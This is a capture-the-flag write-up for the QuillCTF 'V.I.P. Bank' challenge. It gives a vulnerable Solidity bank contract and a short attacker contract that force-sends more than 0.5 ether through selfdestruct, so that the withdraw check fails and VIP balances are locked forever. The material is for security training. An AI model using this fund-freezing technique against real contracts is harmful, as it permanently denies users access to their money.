# [V.I.P. Bank Challenge](https://quillctf.super.site/challenges/quillctf-challenges/road-closed)

- Objective of C.T.F.:
1. At any cost, lock the VIP user balance forever into the contract.

## Analisys and Solution:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

contract VIP_Bank{

    address public manager;
    mapping(address => uint) public balances;
    mapping(address => bool) public VIP;
    uint public maxETH = 0.5 ether;

    constructor() {
        manager = msg.sender;
    }

    modifier onlyManager() {
        require(msg.sender == manager , "you are not manager");
        _;
    }

    modifier onlyVIP() {
        require(VIP[msg.sender] == true, "you are not our VIP customer");
        _;
    }

    function addVIP(address addr) public onlyManager {
        VIP[addr] = true;
    }

    function deposit() public payable onlyVIP {
        require(msg.value <= 0.05 ether, "Cannot deposit more than 0.05 ETH per transaction");
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public onlyVIP {
        require(address(this).balance <= maxETH, "Cannot withdraw more than 0.5 ETH per transaction");
        require(balances[msg.sender] >= _amount, "Not enough ether");
        balances[msg.sender] -= _amount;
        (bool success,) = payable(msg.sender).call{value: _amount}("");
        require(success, "Withdraw Failed!");
    }

    function contractBalance() public view returns (uint){
        return address(this).balance;
    }

}

/** @audit Step #1: We can bypass the deposit constraints by self-destructing a dummy contract with enough funds (more than maxETH),
such that they are transferred to this victim contract. After that, no one will be able to withdraw.*/
contract VIPBankAttacker {
  constructor(address payable targetAddr) payable {
    require(msg.value > 0.5 ether, "need more than 0.5 ether to attack");

    // self destruct to forcefully send ether to target
    selfdestruct(targetAddr);
  }
}

```
